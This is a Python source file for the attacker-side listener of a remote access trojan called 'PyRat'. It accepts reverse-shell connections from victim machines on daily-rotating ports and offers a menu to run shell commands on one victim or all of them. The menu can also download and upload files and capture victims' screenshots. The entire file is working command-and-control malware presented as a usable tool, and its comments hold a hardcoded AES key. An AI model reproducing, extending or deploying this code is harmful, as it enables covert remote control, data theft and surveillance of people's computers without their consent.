# -*- coding: utf-8 -*-
# Author: Yiğit Şık 06/11/2021

# This script will establish the reverse shell connection between attacker and victim machine
# Commands taken from attacker will be executed through this script on victim computer,
# then the results will be sent back

# import Cryptodome.Cipher.AES as AES

# Standard Modules
import base64
import datetime
import socket
import threading
import json
import time
import random
from queue import Queue
import select
import struct


class Listener:
    NUMBER_OF_THREADS = 7
    JOB_NUMBER = [0, 9]
    IP = "0.0.0.0"  # 0.0.0.0
    NUMBER_OF_PORTS = 5
    MAX_PORT_VALUE = 65535
    MIN_PORT_VALUE = 49152

    port_list = []
    socket_list = []
    target = None
    target_ip = ""
    connection_list = []
    address_list = []
    is_date_changed = False

    task_queue = Queue()
    socket_queue = Queue()
    receive_queue = Queue()

    # iv = b"alZtfBYgrEpOidxu"
    # key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
    # cipher_encrypt = AES.new(key, AES.MODE_CFB, IV=iv)
    # cipher_decrypt = AES.new(key, AES.MODE_CFB, IV=iv)

    # Create and listen a tcp server socket with given ip and port values.
    def __init__(self):

        self.create_workers()
        self.create_jobs()

    # ****************** THREAD POOL ******************************************************************

    # Thread pool pattern makes it easy to observe and manage threads
    # Reduces the costs occur when creating and deleting threads

    def create_workers(self):
        for _ in range(self.NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            x = self.task_queue.get()

            if x == 0:
                self.randomize_ports()
            elif x == 1:
                self.create_socket()
            elif x == 2:
                self.listen()
            elif x == 9:
                self.terminal()

            self.task_queue.task_done()

    def create_jobs(self):
        for x in self.JOB_NUMBER:
            self.task_queue.put(x)
        self.task_queue.join()

    # ****************** THREAD POOL ******************************************************************

    def randomize_ports(self):

        date_time = datetime.datetime.now()
        current_day = date_time.day
        step = (self.MAX_PORT_VALUE - self.MIN_PORT_VALUE) / self.NUMBER_OF_PORTS
        random.seed(current_day)
        seed = random.random()

        for i in range(5):
            self.port_list.append(round(self.MIN_PORT_VALUE + step * i + step * seed))

        self.task_queue.put(1)

    def create_socket(self):

        new_socket = None

        for port in self.port_list:

            try:
                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except Exception as msg:
                print("Socket Creation Error " + str(msg))
            try:
                new_socket.bind((self.IP, port))
                new_socket.listen(5)
                self.socket_list.append(new_socket)
                print("[+] Ready to accept connections from port {}".format(port))
            except Exception as msg:
                print("Binding Error: " + str(msg))

            self.task_queue.put(2)

        for i in range(len(self.socket_list)):
            self.socket_queue.put(i)
            self.receive_queue.put(i)

    def listen(self):

        i = self.socket_queue.get()

        while True:
            try:
                if self.socket_list is not None:
                    # Wait for first connection. This is a blocking code
                    response = self.socket_list[i].accept()
                    # This prevents connection from timeout
                    self.socket_list[i].setblocking(True)
                    self.connection_list.append(response[0])
                    self.address_list.append(response[1])
                    print("[+] Got a connection" + str(response[1]))
                else:
                    break
            except Exception as msg:
                print("Listener Error " + str(msg))
                time.sleep(1)

    # List all available connections
    def list_connections(self):

        results = ""

        if len(self.connection_list) < 1:
            print("There is no connection yet")
        else:

            json_data = json.dumps(["AreYouAwake?"]).encode()
            # cipher_bytes = self.cipher_encrypt.encrypt(json_data)
            # encrypted_text = base64.b64encode(cipher_bytes)
            msg = struct.pack('>I', len(json_data)) + json_data

            for i, connection in enumerate(self.connection_list):

                try:
                    # Check if connection is still available
                    connection.send(msg)
                    ready = select.select([connection], [], [], 10)
                    if ready[0]:
                        connection.recv(1024).decode()
                    else:
                        print("Client did not answer, clearing {} from connection list".format(self.address_list[i]))
                        del self.connection_list[i]
                        del self.address_list[i]
                        return -1
                except Exception as msg:
                    # If connection is not available anymore, clear from list
                    del self.connection_list[i]
                    del self.address_list[i]
                    print("Clearing Dead Connections" + str(msg))
                    continue

                results += str(i) + "   " + str(self.address_list[i][0]) + "   " + str(self.address_list[i][1]) + "\n"

            print("----Clients----" + "\n" + results)

    # Get screenshot from the victim computer
    def get_screenshot(self, command, mode):
        if mode == "multi":
            self.send_data(command, "multi")
            ready = select.select(self.connection_list, self.connection_list, self.connection_list, 10)
            i = 0
            for connection in ready[1]:
                raw_msglen = self.__recvlength(4, connection)
                if not raw_msglen:
                    return None
                msglen = struct.unpack('>I', raw_msglen)[0]
                # Read the message data
                screenshot = self.__recvpayload(msglen, connection)
                self.write_file("{}.png".format(i), screenshot)
                i = i + 1
        else:
            self.send_data(command, "single")
            screenshot = self.receive_data("single")
            self.write_file("{}.png".format(self.target_ip), screenshot)

    def send_data(self, data, mode):

        if mode == "multi":
            for connection in self.connection_list:
                json_data = json.dumps(data).encode()
                msg = struct.pack('>I', len(json_data)) + json_data
                connection.sendall(msg)
        else:
            json_data = json.dumps(data).encode()
            msg = struct.pack('>I', len(json_data)) + json_data
            self.target.sendall(msg)

    def receive_data(self, mode):

        if mode == "multi":
            ready = select.select(self.connection_list, self.connection_list, self.connection_list, 5)
            for connection in ready[1]:
                raw_msglen = self.__recvlength(4, connection)
                if not raw_msglen:
                    return None
                msglen = struct.unpack('>I', raw_msglen)[0]
                # Read the message data
                return self.__recvpayload(msglen, connection)
            else:
                return None
        else:
            ready = select.select([self.target], [], [], 5)
            if ready[0]:
                raw_msglen = self.__recvlength(4, self.target)
                if not raw_msglen:
                    return None
                msglen = struct.unpack('>I', raw_msglen)[0]
                return self.__recvpayload(msglen, self.target)
            else:
                return None

    def __recvlength(self, msglen, connection):
        data = bytearray()
        while len(data) < msglen:
            packet = connection.recv(msglen - len(data))
            if not packet:
                return None
            data.extend(packet)
        return data

    def __recvpayload(self, msglen, connection):
        data = bytearray()
        while len(data) < msglen:
            packet = connection.recv(msglen - len(data))
            if not packet:
                return None
            data.extend(packet)

        # base64decoded = base64.b64decode(data)
        # decrypted_text = self.cipher_decrypt.decrypt(base64decoded)
        return json.loads(data)

    # Send commands to be executed on victim machine
    def execute_remotely(self, command, mode):

        if mode == "multi":
            self.send_data(command, "multi")
            return self.receive_data("multi")
        else:
            self.send_data(command, "single")
            return self.receive_data("single")

    # Read and write files in base64 format to transfer bytes reliably.
    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except FileNotFoundError as e:
            print(e.strerror)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def help(self):
        print("\n[*] PyRat commands are listed below. You can also use shell commands [*]\n")
        print("list -> lists all available connections")
        print("select <index> -> selects a connection")
        print("download <filename> -> downloads a file from victim machine")
        print("upload <filename> uploads a file from this machine to victim")
        print("screenshot -> gets a screenshot from victims computer")
        print("track --list, -l -> list all track words")
        print("track --add, -a -> adds a word to track list")
        print("track --remove, -r -> removes a word from track list")

    # This is the part where all connections will be listed, and serve as a dashboard or main menu
    def terminal(self):

        ascii_art = """               
                     ______         _   
                      | ___ \       | |  
         _ __   _   _ | |_/ /  __ _ | |_ 
        | '_ \ | | | ||    /  / _` || __|
        | |_) || |_| || |\ \ | (_| || |_ 
        | .__/  \__, |\_| \_| \__,_| \__|
        | |      __/ |                   
        |_|     |___/                   
                    """

        print(ascii_art)

        while True:

            command = input(">>")
            command = command.split(" ")

            # List all available connections
            if command[0] == "list":
                self.list_connections()
                continue

            # Select from available connections
            elif command[0] == "select":
                try:
                    selection = int(command[1])
                    self.target = self.connection_list[selection]
                    self.target_ip = self.address_list[selection]
                    print("You Have Now Connected To {}".format(self.target_ip))
                    self.connect_to_the_target()
                except Exception as e:
                    print(e)
            else:
                print("Unknown Command, use list or select")

    # Here we are sending commands to be executed on victim machine which their result
    # will be sent back to us
    def connect_to_the_target(self):

        while True:

            # Input commands from terminal
            command = input("{}>> ".format(self.target_ip[0]))
            command = command.split()

            result = ""

            if len(command) > 0:

                # Get files from the victim machine
                if command[0] == "download":
                    binaryFile = self.execute_remotely(command, "single")
                    result = self.write_file(command[1], binaryFile)

                # Send files to the victim machine
                elif command[0] == "upload":
                    file_content = self.read_file(command[1])
                    if file_content is None:
                        continue
                    command.append(file_content.decode())
                    result = self.execute_remotely(command, "single")

                # List all available connections
                elif command[0] == "list":
                    result = self.list_connections()
                    if result == -1:
                        break
                    continue

                # Select from available connections
                elif command[0] == "select":

                    selection = int(command[1])
                    self.target = self.connection_list[selection]
                    self.target_ip = self.address_list[selection]
                    print("You Have Now Connected To {}".format(self.target_ip))
                    continue

                # Get screenshot from target computer
                elif command[0] == "screenshot":
                    self.get_screenshot(command, "single")
                    result = "Successfully grabbed screenshot from {}".format(self.target_ip)

                elif command[0] == "*":
                    if command[1] == "screenshot":
                        self.get_screenshot(command[1:], "multi")
                        result = "Successfully grabbed screenshot from all clients"
                    else:
                        result = self.execute_remotely(command[1:], "multi")

                elif command[0] == "help":
                    self.help()
                    continue

                # Exit to main menu
                elif command[0] == "exit":
                    break

                else:
                    result = self.execute_remotely(command, "single")

            # Print results to the terminal
            print(result)


# Create the server socket
my_listener = Listener()
